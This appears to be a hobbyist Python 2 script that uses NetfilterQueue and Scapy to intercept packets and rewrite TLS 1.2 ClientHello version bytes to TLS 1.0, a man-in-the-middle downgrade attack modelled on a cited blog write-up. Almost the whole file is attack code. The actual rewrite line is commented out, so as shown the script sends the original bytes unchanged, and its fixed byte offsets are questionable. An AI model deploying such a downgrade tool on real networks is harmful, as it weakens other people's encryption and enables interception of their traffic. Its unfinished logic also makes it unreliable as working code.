#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
#
# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
# https://tls.ulfheim.net
#

from netfilterqueue import NetfilterQueue
from scapy import *

scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
__builtins__.__dict__.update(scapy_builtins)

nfQueueID         = 0
maxPacketsToStore = 100

def packetReceived(pkt):
  #print("Accepted a new packet...")
  print("...")
  ip = IP(pkt.get_payload())

  if not ip.haslayer("Raw"):
    pkt.accept();

  else:
    tcpPayload = ip["Raw"].load                                             
                                                                            
    # Adjusted the matching rules for Python 2 and old Scapy.               
    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
      print("TLS handshake found, client HELLO.")                                      
                                                                                       
      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':                         
        print("TLS v1.2, dropping down to v1.0")                                       
        msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it            
        msgBytes2 = [b for b in msgBytes]                                              
                                                                                       
        print("msgB is: ", type(msgBytes))                                             
        print("msgB2 is: ", type(msgBytes2))                                           
        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")         
        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")         
                                                                                       
        msgBytes2[61] = '\x03'                                                         
        msgBytes2[62] = '\x01'                                                         
                                                                                       
        print("Byte 61 is now: ", msgBytes2[61], ".")                                  
        print("Byte 62 is now: ", msgBytes2[62], ".")                                  
                                                                                       
#        pkt.set_payload(bytes(msgBytes2))                                             
        pkt.set_payload(msgBytes)                                                      
                                                                                       
      pkt.accept()                                                                     
    else:                                                                              
      pkt.accept();

print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, packetReceived, maxPacketsToStore) # binds to queue 0, use handler "packetReceived()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

